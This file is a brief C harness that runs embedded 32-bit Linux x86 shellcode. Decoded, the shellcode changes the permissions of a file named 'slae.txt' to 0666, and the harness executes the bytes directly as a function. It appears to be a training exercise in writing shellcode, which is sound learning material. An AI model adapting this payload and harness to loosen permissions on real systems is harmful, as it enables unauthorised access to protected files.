#include<stdio.h>
#include<string.h>

unsigned char code[] =
"\x99\x6a\x0f\x58\x52\xe8\x09\x00\x00\x00\x73\x6c\x61\x65\x2e"
"\x74\x78\x74\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01"
"\x58\xcd\x80";


main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}

